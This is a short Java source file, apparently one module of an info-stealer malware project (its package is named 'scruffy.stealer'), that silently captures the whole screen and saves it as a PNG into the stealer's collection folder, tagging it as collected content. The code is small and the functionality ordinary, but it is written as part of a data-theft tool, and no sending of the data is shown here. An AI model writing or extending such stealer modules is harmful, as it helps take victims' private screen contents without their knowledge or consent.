package scruffy.stealer.impl.system;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.io.File;

import javax.imageio.ImageIO;

import scruffy.stealer.utils.utilities;

public class screenshot extends utilities {

	public void initialize() throws Exception {
	    ImageIO.write(new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize())), "png", new File(getFolder() + "/screenshot.png"));
		content.add("screenshot");
	}
	
}